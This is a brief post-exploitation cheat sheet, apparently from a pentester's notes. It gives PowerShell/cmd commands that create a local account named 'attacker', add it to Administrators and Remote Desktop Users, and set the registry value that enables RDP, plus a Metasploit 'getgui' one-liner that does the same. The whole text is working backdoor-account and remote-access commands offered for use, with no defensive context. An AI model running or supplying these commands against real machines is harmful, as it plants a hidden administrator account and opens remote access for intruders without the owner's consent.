# Adding Admin user + adding to RDP
```powershell
net user /add attacker password123
net localgroup administrators attacker /add
net localgroup "Remote Desktop Users" attacker /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



# getgui (Metasploit)
```
run getgui -e -u atk -p atk
```